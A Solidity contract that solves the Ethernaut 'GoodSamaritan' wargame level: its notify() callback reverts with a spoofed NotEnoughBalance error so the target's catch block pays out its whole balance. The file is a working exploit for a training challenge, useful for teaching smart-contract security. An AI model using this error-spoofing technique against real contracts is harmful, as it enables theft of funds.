// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INotifyable {
    function notify(uint256 amount) external;
}

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
}

contract GoodSamaritanExploit is INotifyable {
    IGoodSamaritan public implementation;
    error NotEnoughBalance();

    /// @notice Constructor called at deployment of contract
    /// @param _implementation contract address of ethernaut `GoodSamaritan` challenge
    /// Note: https://ethernaut.openzeppelin.com/level/0x8d07AC34D8f73e2892496c15223297e5B22B3ABE
    constructor(IGoodSamaritan _implementation) {
        implementation = _implementation;
    }

    /// @notice Callback to throw error message that triggers `catch` block in `requestDonation()` logic
    function notify(uint256 amount) external pure override {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    /// @notice Request donation to trigger `notify()` callback
    function exploit() external {
        implementation.requestDonation();
    }
}
